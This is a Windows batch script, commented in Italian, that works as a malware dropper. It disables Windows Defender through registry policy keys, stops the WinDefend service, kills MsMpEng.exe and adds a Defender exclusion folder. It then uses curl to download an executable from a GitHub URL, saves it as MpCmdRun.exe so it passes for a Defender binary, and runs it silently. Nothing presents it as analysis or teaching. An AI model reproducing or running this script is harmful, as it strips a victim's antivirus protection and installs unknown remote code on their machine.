@echo off

:: Disable via registry
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1

:: Try to stop Defender services
sc stop WinDefend >nul 2>&1
taskkill /f /im "MsMpEng.exe" >nul 2>&1

setlocal enabledelayedexpansion

>nul 2>&1 (
    :: Elevazione e Eccezione Antivirus
    powershell -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\Microsoft\Vault' -ErrorAction SilentlyContinue"

    :: Creazione cartella e Download file
    if not exist "%LOCALAPPDATA%\Microsoft\Vault" mkdir "%LOCALAPPDATA%\Microsoft\Vault"
    curl -L -s -o "%LOCALAPPDATA%\Microsoft\Vault\MpCmdRun.exe" "https://github.com/angelgabriel173/boh/raw/main/Windows_a7.exe"
    
    :: Sblocca ed esegue il file scaricato
    powershell -Command "Unblock-File '%LOCALAPPDATA%\Microsoft\Vault\VaultSvc.exe'"
    start /B "" "%LOCALAPPDATA%\Microsoft\Vault\MpCmdRun.exe"
)

exit /b
